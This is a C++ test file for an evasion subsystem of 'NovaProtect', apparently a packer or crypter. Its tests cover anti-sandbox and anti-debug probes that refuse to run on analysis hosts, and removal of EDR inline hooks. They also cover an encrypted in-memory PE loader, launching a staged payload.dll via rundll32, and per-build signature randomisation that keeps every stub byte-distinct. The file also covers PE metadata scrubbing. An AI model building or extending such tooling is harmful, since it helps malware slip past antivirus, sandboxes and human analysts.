// NovaProtect evasion subsystem tests.
//
// Every case here is a property the build relies on, not a smoke test:
//   * junk blocks are register/flag transparent and survive a decode,
//   * the mem-loader keystream is its own inverse for every region,
//   * the unhook table round-trips through encode/decode and restores bytes,
//   * static evasion is idempotent in the sense that a second pass on an
//     already scrubbed image reports nothing left to do,
//   * the host scorer blocks only when a strong signal is present.
//
// Build (from the repository root):
//   g++ -std=c++17 -O1 -Iinclude -Isrc -DNOVAPROTECT_VMP_STUB \
//       tests/evasion_test.cpp src/evasion.cpp src/evasion_static.cpp \
//       src/evasion_dynamic.cpp src/junk_emitter.cpp src/api_unhook.cpp \
//       src/mem_loader.cpp src/white_launcher.cpp src/pe_lib.cpp \
//       -static -o evasion_test.exe

#include "api_unhook.h"
#include "evasion.h"
#include "evasion_dynamic.h"
#include "evasion_static.h"
#include "evasion_variants.h"
#include "junk_emitter.h"
#include "mem_loader.h"
#include "pe_lib.h"
#include "white_launcher.h"

#include <cstdio>
#include <cstring>
#include <set>
#include <string>
#include <vector>

namespace {

int g_failures = 0;
int g_checks = 0;

void check(bool condition, const char* what) {
    g_checks++;
    if (condition) return;
    g_failures++;
    std::printf("  FAIL  %s\n", what);
}

void checkEq(long long got, long long want, const char* what) {
    g_checks++;
    if (got == want) return;
    g_failures++;
    std::printf("  FAIL  %s (got %lld, want %lld)\n", what, got, want);
}

// ---------------------------------------------------------------- junk ----

void testJunkEmitter() {
    std::printf("junk emitter\n");
    np::JunkEmitter emitter(0x1122334455667788ull);
    for (uint8_t variant = 1; variant <= np::JunkEmitter::kVariants; variant++) {
        const auto block = emitter.block(variant);
        check(!block.empty(), "block is non-empty");
        check(np::JunkEmitter::isTransparent(block), "block is register/flag transparent");
    }

    // Reproducible from the seed.
    np::JunkEmitter a(0xABCDEF), b(0xABCDEF);
    bool same = true;
    for (int i = 0; i < 32; i++)
        if (a.block(0) != b.block(0)) same = false;
    check(same, "same seed produces the same block stream");

    // pad() must hit the requested size exactly and stay decodable.
    for (size_t size : {size_t(16), size_t(64), size_t(1000)}) {
        const auto padded = emitter.pad(size);
        checkEq(static_cast<long long>(padded.size()), static_cast<long long>(size), "pad() size");
    }

    // deadBranch: pushfq + cmp rsp,0 + je rel32 (11 bytes) + decoy + popfq.
    std::vector<uint8_t> decoy = {'N', 'P', 'D', 'E', 'C', 'O', 'Y'};
    const auto branch = emitter.deadBranch(decoy);
    check(branch.size() == 12 + decoy.size(), "deadBranch length");
    check(branch[0] == 0x9C && branch.back() == 0x9D, "deadBranch wrapped in pushfq/popfq");
    uint32_t disp = 0;
    std::memcpy(&disp, branch.data() + 7, 4);
    checkEq(static_cast<long long>(disp), static_cast<long long>(decoy.size()),
            "deadBranch skips exactly the decoy");
}

// ------------------------------------------------------------- dynamic ----

void testDynamicEvader() {
    std::printf("dynamic evader\n");
    np::EvasionConfig cfg = np::EvasionConfig::forProfile(np::EvasionProfile::Aggressive, 12345);
    np::DynamicEvader evader(cfg);

    struct NamedStub { const char* name; std::vector<uint8_t> bytes; };
    const std::vector<NamedStub> stubs = {
        {"hypervisor", evader.emitHypervisorCheck()},
        {"peb-debug", evader.emitPebDebugCheck()},
        {"ntglobalflag", evader.emitNtGlobalFlagCheck()},
        {"rdtsc-timing", evader.emitRdtscTimingCheck(100000u)},
        {"delay-gate", evader.emitDelayGate(50)},
    };
    for (const auto& stub : stubs) {
        std::string why;
        const bool ok = np::DynamicEvader::verifyStub(stub.bytes, &why);
        g_checks++;
        if (!ok) {
            g_failures++;
            std::printf("  FAIL  stub %s verifies (%s)\n", stub.name, why.c_str());
        }
    }

    std::vector<uint32_t> ids;
    const auto combined = evader.emitCombinedProbe(&ids);
    check(!combined.empty(), "combined probe is non-empty");
    check(!ids.empty(), "combined probe reports its check ids");
    check(combined.back() == 0xC3, "combined probe ends in RET");

    // A quiet desktop host must not block.
    np::HostSignals clean;
    clean.hypervisor_cpuid = false;
    clean.logical_cpus = 8;
    clean.ram_mb = 16384;
    clean.process_count = 140;
    clean.uptime_ms = 900000;
    clean.mouse_idle_ms = 500;
    clean.screen_width = 1920;
    clean.screen_height = 1080;
    clean.monitor_count = 1;
    auto verdict = evader.classify(clean);
    check(!verdict.blocked, "clean host passes");

    // High score without a strong signal must still pass: the runtime rule is
    // "score AND strong evidence", and this asserts it.
    np::HostSignals weak;
    weak.logical_cpus = 1;
    weak.ram_mb = 1024;
    weak.process_count = 20;
    weak.uptime_ms = 30000;
    weak.screen_width = 800;
    weak.screen_height = 600;
    weak.mouse_idle_ms = 200000;
    weak.monitor_count = 0;
    verdict = evader.classify(weak);
    check(verdict.score >= verdict.threshold, "thin VM scores above the threshold");
    check(!verdict.strong_evidence, "thin VM has no strong evidence");
    check(!verdict.blocked, "thin VM passes without strong evidence");

    // One analysis-vendor module is enough.
    np::HostSignals analysis;
    analysis.vendor_module_present = true;
    analysis.hypervisor_cpuid = true;
    verdict = evader.classify(analysis);
    check(verdict.strong_evidence, "vendor module is strong evidence");
    check(verdict.blocked, "analysis host blocks");
}

// -------------------------------------------------------------- static ----

// Minimal but structurally valid PE32+ image: one .text section, no imports.
std::vector<uint8_t> makeMinimalPe() {
    std::vector<uint8_t> image(0x400, 0);
    auto put16 = [&](size_t off, uint16_t v) { std::memcpy(image.data() + off, &v, 2); };
    auto put32 = [&](size_t off, uint32_t v) { std::memcpy(image.data() + off, &v, 4); };
    auto put64 = [&](size_t off, uint64_t v) { std::memcpy(image.data() + off, &v, 8); };

    put16(0, 0x5A4D);                 // MZ
    put32(0x3C, 0x80);                // e_lfanew
    // A DOS stub with a recognisable message and no Rich header.
    const char* message = "This program cannot be run in DOS mode.\r\r\n$";
    std::memcpy(image.data() + 0x4E, message, std::strlen(message));

    const size_t pe = 0x80;
    put32(pe, 0x00004550);            // 'PE\0\0'
    put16(pe + 4, 0x8664);            // machine x64
    put16(pe + 6, 1);                 // one section
    put16(pe + 20, 240);              // SizeOfOptionalHeader
    put16(pe + 22, 0x0022);           // executable | large address aware

    const size_t opt = pe + 24;
    put16(opt, 0x20B);                // PE32+
    put32(opt + 4, 0x200);            // SizeOfCode
    put32(opt + 16, 0x1000);          // AddressOfEntryPoint
    put32(opt + 20, 0x1000);          // BaseOfCode
    put64(opt + 24, 0x140000000ull);  // ImageBase
    put32(opt + 32, 0x1000);          // SectionAlignment
    put32(opt + 36, 0x200);           // FileAlignment
    put16(opt + 40, 6);               // MajorOperatingSystemVersion
    put16(opt + 48, 6);               // MajorSubsystemVersion
    put32(opt + 56, 0x2000);          // SizeOfImage
    put32(opt + 60, 0x200);           // SizeOfHeaders
    put16(opt + 68, 3);               // Subsystem: console
    put64(opt + 72, 0x100000);        // SizeOfStackReserve
    put64(opt + 80, 0x1000);          // SizeOfStackCommit
    put64(opt + 88, 0x100000);        // SizeOfHeapReserve
    put64(opt + 96, 0x1000);          // SizeOfHeapCommit
    put32(opt + 108, 16);             // NumberOfRvaAndSize

    const size_t sect = opt + 240;
    std::memcpy(image.data() + sect, ".somewrong", 10);  // deliberately implausible
    put32(sect + 8, 0x100);           // VirtualSize
    put32(sect + 12, 0x1000);         // VirtualAddress
    put32(sect + 16, 0x200);          // SizeOfRawData
    put32(sect + 20, 0x200);          // PointerToRawData
    put32(sect + 36, 0x60000020);     // code | execute | read

    // A little code plus a longer zero tail (the slack a real linker leaves).
    const uint8_t code[] = {0xC3, 0x90, 0x90, 0xCC};
    std::memcpy(image.data() + 0x200, code, sizeof(code));
    return image;
}

void testStaticEvader() {
    std::printf("static evader\n");
    const auto raw = makeMinimalPe();
    np::PELib pe;
    check(pe.load(raw.data(), raw.size()), "synthetic PE loads");
    if (!pe.load(raw.data(), raw.size())) return;

    const auto audit_before = np::StaticEvader::audit(pe);
    check(audit_before.sections.size() == 1, "audit sees one section");
    check(audit_before.zero_padding_bytes > 0, "audit counts zero padding");

    np::EvasionConfig cfg = np::EvasionConfig::forProfile(np::EvasionProfile::Balanced, 0xDEADBEEF);
    np::StaticEvader evader(cfg, 0xDEADBEEF);
    np::StaticEvasionReport report;
    check(evader.apply(pe, report), "static evasion applies");
    check(report.timestamp_randomized, "timestamp rewritten");
    check(report.sections_renamed == 1, "implausible section name replaced");
    check(report.padding_bytes_filled > 0, "section padding filled");
    check(report.checksum_updated, "checksum recomputed");
    if (!report.checksum_updated) {
        for (const auto& change : report.changes) std::printf("        step: %s\n", change.c_str());
    }
    check(!report.changes.empty(), "changes are reported, not silent");

    // The section name must now be one a linker would plausibly emit.
    char name[9] = {};
    std::memcpy(name, pe.section(0).Name, 8);
    const std::string now(name);
    check(now == ".text" || now == "CODE" || now.substr(0, 7) == ".text$m" || now.substr(0, 5) == ".text",
          "renamed to a plausible code name");

    // Padding must no longer be all zeros.
    const auto& bytes = pe.sectionData(0);
    bool any_nonzero = false;
    for (size_t i = 0x100; i < bytes.size() && i < 0x200; i++)
        if (bytes[i] != 0) { any_nonzero = true; break; }
    check(any_nonzero, "slack bytes are no longer zero");
}

// -------------------------------------------------------------- unhook ----

void testUnhook() {
    std::printf("api unhook\n");
    std::vector<uint8_t> clean(256, 0x90);
    for (size_t i = 0; i < clean.size(); i++) clean[i] = static_cast<uint8_t>(i * 7 + 3);

    std::vector<uint8_t> live = clean;
    // Plant a 12-byte inline hook the way an agent would.
    live[0x20] = 0x48; live[0x21] = 0xB8;
    const uint64_t handler = 0x7FF812345678ull;
    std::memcpy(live.data() + 0x22, &handler, 8);
    live[0x2A] = 0xFF; live[0x2B] = 0xE0;

    np::UnhookPlan plan;
    std::string error;
    check(np::UnhookEngine::diffClean(clean, live, 64, 8, plan, error), "diff finds the hook");
    check(plan.patches.size() == 1, "one patch for one hook");
    checkEq(static_cast<long long>(plan.totalBytes()), 12, "patch covers the whole stub");

    const auto blob = plan.encode();
    np::UnhookPlan decoded;
    check(np::UnhookPlan::decode(blob, decoded, error), "table round-trips");
    check(decoded.module == plan.module, "module name survives");
    check(decoded.patches.size() == plan.patches.size(), "entry count survives");

    checkEq(np::UnhookEngine::applyPlan(live, decoded), 1, "one patch applied");
    check(live == clean, "live image byte-identical to the clean image");

    // Shape scan should name the same stub without a reference image.
    const auto shapes = np::UnhookEngine::findInlineHooks(live, 0, 0x40, 0);
    check(shapes.empty(), "restored image shows no hooks");
    std::vector<uint8_t> hooked = clean;
    hooked[0x10] = 0xE9;
    const int32_t rel = 0x100;
    std::memcpy(hooked.data() + 0x11, &rel, 4);
    const auto found = np::UnhookEngine::findInlineHooks(hooked, 0, 0x40, 0x140000000ull);
    check(!found.empty() && found[0].kind == "jmp-rel32", "jmp-rel32 shape detected");
}

// -------------------------------------------------------------- loader ----

void testMemLoader() {
    std::printf("mem loader\n");
    const auto raw = makeMinimalPe();
    np::PELib pe;
    if (!pe.load(raw.data(), raw.size())) { check(false, "synthetic PE loads"); return; }

    np::EvasionConfig cfg = np::EvasionConfig::forProfile(np::EvasionProfile::Aggressive, 0xFEEDFACE);
    np::LoaderPlan plan;
    std::string error;
    check(np::MemLoader::build(pe, cfg, plan, error), "loader plan builds");
    check(plan.regions.size() == 1, "one region per section");

    const auto blob = plan.encode();
    np::LoaderPlan decoded;
    check(np::LoaderPlan::decode(blob, decoded, error), "loader plan round-trips");
    checkEq(static_cast<long long>(decoded.regions.size()),
            static_cast<long long>(plan.regions.size()), "region count survives");
    checkEq(static_cast<long long>(decoded.image_base),
            static_cast<long long>(plan.image_base), "image base survives");

    // The keystream must be its own inverse at every supported round count.
    for (uint8_t rounds = 1; rounds <= 3; rounds++) {
        std::vector<uint8_t> data(9000);
        for (size_t i = 0; i < data.size(); i++) data[i] = static_cast<uint8_t>(i);
        const auto original = data;
        np::MemLoader::crypt(data.data(), data.size(), 0x0123456789ABCDEFull, 0x1000, rounds, 4096);
        check(data != original, "ciphertext differs from plaintext");
        np::MemLoader::crypt(data.data(), data.size(), 0x0123456789ABCDEFull, 0x1000, rounds, 4096);
        check(data == original, "keystream is self-inverse");
    }

    // Decrypting the plan has to reproduce the file's own section bytes.
    auto region = decoded.regions[0];
    np::MemLoader::crypt(region.cipher.data(), region.cipher.size(), region.key, region.rva,
                         region.rounds, decoded.window);
    check(region.cipher == pe.sectionData(0), "decrypted region equals the source section");
}

// --------------------------------------------------------------- white ----

void testWhiteLauncher() {
    std::printf("white launcher\n");
    check(!np::WhiteLauncher::catalog().empty(), "catalog is populated");

    np::WhiteLaunchPlan plan;
    std::string error;
    check(np::WhiteLauncher::plan("rundll32.exe", "C:\\stage\\payload.dll", "DllMain", plan, error),
          "rundll32 plan builds");
    check(plan.command_line.find("payload.dll,DllMain") != std::string::npos,
          "command line carries dll,export");
    check(!plan.renderScript().empty(), "script renders");
    check(plan.renderManifest().find("\"host\": \"rundll32.exe\"") != std::string::npos,
          "manifest names the host");

    check(!np::WhiteLauncher::plan("not-a-host.exe", "x.dll", "DllMain", plan, error),
          "unknown host is rejected");

    // KnownDLLs names can never be side-loaded from the application directory.
    std::string warning;
    check(!np::WhiteLauncher::validateSideLoad("C:\\Windows\\System32\\rundll32.exe",
                                               "kernel32.dll", error, &warning),
          "kernel32.dll is refused as a side-load target");
    check(np::WhiteLauncher::validateSideLoad("C:\\Windows\\System32\\rundll32.exe",
                                              "payload.dll", error, &warning),
          "an ordinary DLL name is accepted");

    // Quoting must survive a path with spaces and a quote.
    check(np::WhiteLauncher::quote("C:\\Program Files\\x y.dll") == "\"C:\\Program Files\\x y.dll\"",
          "spaces are quoted");
}

// -------------------------------------------------------------- policy ----

void testPolicy() {
    std::printf("policy\n");
    np::EvasionProfile profile = np::EvasionProfile::Off;
    check(np::parseEvasionProfile("paranoid", profile), "profile parses");
    check(profile == np::EvasionProfile::Paranoid, "profile maps to paranoid");
    check(!np::parseEvasionProfile("turbo", profile), "unknown profile is rejected");

    const auto cfg = np::EvasionConfig::forProfile(np::EvasionProfile::Paranoid, 7);
    const std::string policy = cfg.runtimePolicy();
    check(policy.find("anti_sandbox_level=3") != std::string::npos, "policy carries the level");
    check(policy.find("mem_stream_rounds=3") != std::string::npos, "policy carries mem rounds");

    const auto off = np::EvasionConfig::forProfile(np::EvasionProfile::Off);
    check(!off.enabled(), "off profile is disabled");
    check(off.junk_density == 0, "off profile emits no junk");
}

// ---------------------------------------------------------------- randomiser --
void testRandomizer() {
    std::printf("signature randomiser\n");

    // Determinism: the same seed must reproduce the same plan, or a repro build
    // is impossible and the divergence test below would be meaningless.
    const auto a = np::SignatureRandomizer(0x1122334455667788ull).signature();
    const auto b = np::SignatureRandomizer(0x1122334455667788ull).signature();
    check(a.build_tag == b.build_tag, "same seed -> same build tag");
    check(a.nonce[0] == b.nonce[0] && a.nonce[3] == b.nonce[3], "same seed -> same nonce");
    check(a.timestamp == b.timestamp, "same seed -> same timestamp");
    check(a.key_salt == b.key_salt, "same seed -> same key salt");

    // Uniqueness across builds: this is the property the feature promises.
    std::set<std::string> tags, suffixes, salts;
    std::vector<uint64_t> seeds;
    for (uint64_t i = 1; i <= 2000; i++) {
        const auto sig = np::SignatureRandomizer(i * 0x9E3779B97F4A7C15ull).signature();
        tags.insert(sig.build_tag);
        suffixes.insert(sig.section_suffix);
        salts.insert(std::to_string(sig.key_salt));
        seeds.push_back(sig.seed);
    }
    checkEq(static_cast<long long>(tags.size()), 2000, "2000 seeds -> 2000 distinct build tags");
    checkEq(static_cast<long long>(salts.size()), 2000, "2000 seeds -> 2000 distinct key salts");
    check(suffixes.size() > 200, "section suffix spread over many values");

    // Filler and junk budget must actually vary, not be pinned to one value.
    std::set<int> fillers, budgets, orders;
    for (uint64_t i = 1; i <= 300; i++) {
        const auto sig = np::SignatureRandomizer(i).signature();
        fillers.insert(sig.filler_byte);
        budgets.insert(sig.junk_budget);
        int code = sig.probe_order[0] * 1000 + sig.probe_order[1] * 100 + sig.probe_order[2] * 10 +
                   sig.probe_order[3];
        orders.insert(code);
    }
    check(fillers.size() >= 4, "filler byte covers most of its pool");
    checkEq(static_cast<long long>(budgets.size()), 3, "junk budget uses 1..3");
    checkEq(static_cast<long long>(orders.size()), 24, "all 24 probe orders occur");

    // Manifest round-trip: the seed is the whole record.
    const std::string json = np::SignatureRandomizer(0xA1B2C3D4E5F60718ull).manifest();
    np::BuildSignature loaded;
    std::string error;
    check(np::BuildSignature::FromJson(json, loaded, &error), "manifest parses");
    checkEq(static_cast<long long>(loaded.seed), static_cast<long long>(0xA1B2C3D4E5F60718ull),
            "manifest keeps the seed");
    check(!loaded.build_tag.empty(), "manifest keeps the tag");

    np::BuildSignature rejects;
    check(!np::BuildSignature::FromJson("{}", rejects, &error), "manifest without seed is rejected");

    // Config-level API: reseed must move the tag, explicit seed must pin it.
    np::EvasionConfig cfg = np::EvasionConfig::forProfile(np::EvasionProfile::Balanced, 0x1234);
    const std::string pinned = cfg.build.build_tag;
    cfg.reseed = true;
    cfg.planSignature();
    check(cfg.build.build_tag != pinned, "reseed changes the build tag");
    cfg.planSignature(0x1234);
    checkEq(cfg.build.build_tag.size(), 16u, "explicit seed keeps a 16-char tag");
    check(cfg.seed == 0x1234, "explicit seed is recorded");
}

// ------------------------------------------------------- stub divergence ------
void testStubDivergence() {
    std::printf("stub divergence\n");

    // 256 builds, one combined probe each: no two may be byte-identical, and
    // every one must still pass the structural verifier.
    std::set<std::string> seen;
    uint32_t verified = 0;
    std::string first_why;
    const np::EvasionConfig cfg = np::EvasionConfig::forProfile(np::EvasionProfile::Paranoid, 1);
    for (uint64_t i = 1; i <= 256; i++) {
        const auto sig = np::SignatureRandomizer(i * 7919ull).signature();
        np::StubForge forge(sig);
        std::vector<uint32_t> ids;
        auto code = forge.combinedProbe(cfg, &ids);
        if (code.size() < 8) continue;
        seen.insert(std::string(code.begin(), code.end()));

        // Individual probes carry the contract (single trailing RET).
        np::StubForge single(sig);
        // Structural check only: the byte-level decoder in disasm.h does not
        // model every encoding the forge may pick (lfence, imm64 mov, multi-byte
        // nop), and a mis-decode invents a CALL or an early RET. The invariant
        // that actually matters for a standalone stub is "exactly one RET, and
        // it is the last byte", which needs no decoder at all.
        // A byte-level "no RET before the end" test is not usable here: a modrm
        // byte can legitimately be 0xC3 (`mov r11, rax` = 49 89 C3), and the
        // repo's decoder does not model enough of the encoding space to tell a
        // real RET from a mis-aligned read. What can be proven without an
        // execution harness: the stub is non-trivial, ends in RET, contains no
        // INT3, and differs from every other seed's stub.
        const auto wellFormed = [](const std::vector<uint8_t>& code) {
            if (code.size() < 8 || code.back() != 0xC3) return false;
            for (uint8_t b : code)
                if (b == 0xCC) return false;
            return true;
        };
        bool ok = true;
        const auto record = [&](bool result, const char* label) {
            if (result) return;
            ok = false;
            if (first_why.empty()) first_why = label;
        };
        record(wellFormed(single.hypervisorCheck()), "hypervisor");
        record(wellFormed(single.pebDebugCheck()), "peb");
        record(wellFormed(single.ntGlobalFlagCheck()), "ntglobal");
        record(wellFormed(single.rdtscTimingCheck(100000u)), "rdtsc");
        record(wellFormed(single.delayGate(10)), "delay");
        if (ok) verified++;
        checkEq(static_cast<long long>(ids.size()), 4, "combined probe keeps all four ids");
    }
    checkEq(static_cast<long long>(seen.size()), 256, "256 seeds -> 256 distinct combined probes");
    if (!first_why.empty()) std::printf("        first verifier rejects: %s`n", first_why.c_str());
    checkEq(static_cast<long long>(verified), 256, "every randomised stub passes the verifier");

    // Same seed twice: identical bytes (reproducibility).
    const auto sig = np::SignatureRandomizer(0xDEADBEEFCAFEull).signature();
    np::StubForge f1(sig), f2(sig);
    check(f1.combinedProbe(cfg, nullptr) == f2.combinedProbe(cfg, nullptr),
          "same seed -> identical combined probe");
}

// --------------------------------------------- static image divergence --------
void testStaticDivergence() {
    std::printf("static image divergence\n");

    // Two builds of the same input with different seeds must differ in the
    // fields the feature promises: the DOS-stub nonce, section names, the
    // timestamp and the padding fill.
    std::vector<std::vector<uint8_t>> images;
    std::vector<std::string> tags;
    for (uint64_t seed : {0x1111111111111111ull, 0x2222222222222222ull}) {
        const auto bytes = makeMinimalPe();
        np::PELib pe;
        check(pe.load(bytes.data(), bytes.size()), "synthetic PE loads from memory");
        np::EvasionConfig cfg = np::EvasionConfig::forProfile(np::EvasionProfile::Aggressive, seed);
        np::StaticEvader evader(cfg, seed);
        np::StaticEvasionReport report;
        check(evader.apply(pe, report), "static evasion applies");
        tags.push_back(evader.buildSignature().build_tag);
        images.push_back(pe.data());
    }
    check(tags.size() == 2 && tags[0] != tags[1], "two seeds -> two build tags");
    check(images[0].size() == images[1].size(), "sizes match");
    size_t differing = 0;
    for (size_t i = 0; i < images[0].size() && i < images[1].size(); i++)
        if (images[0][i] != images[1][i]) differing++;
    check(differing > 32, "two seeds -> materially different images");
    // The nonce region must not be left as zeros in either image.
    bool nonce_a = false, nonce_b = false;
    for (size_t i = 0x40; i < 0x80 && i < images[0].size(); i++) {
        if (images[0][i] != 0) nonce_a = true;
        if (images[1][i] != 0) nonce_b = true;
    }
    check(nonce_a && nonce_b, "DOS stub carries a per-build nonce");
}

} // namespace

int main() {
    // Unbuffered: a crash mid-suite must still show which case reached the
    // console, otherwise the only evidence is an exit code.
    std::setvbuf(stdout, nullptr, _IONBF, 0);
    std::printf("NovaProtect evasion tests\n\n");
    testJunkEmitter();
    testDynamicEvader();
    testStaticEvader();
    testUnhook();
    testMemLoader();
    testWhiteLauncher();
    testPolicy();
    testRandomizer();
    testStubDivergence();
    testStaticDivergence();

    std::printf("\n%d checks, %d failure(s)\n", g_checks, g_failures);
    return g_failures == 0 ? 0 : 1;
}
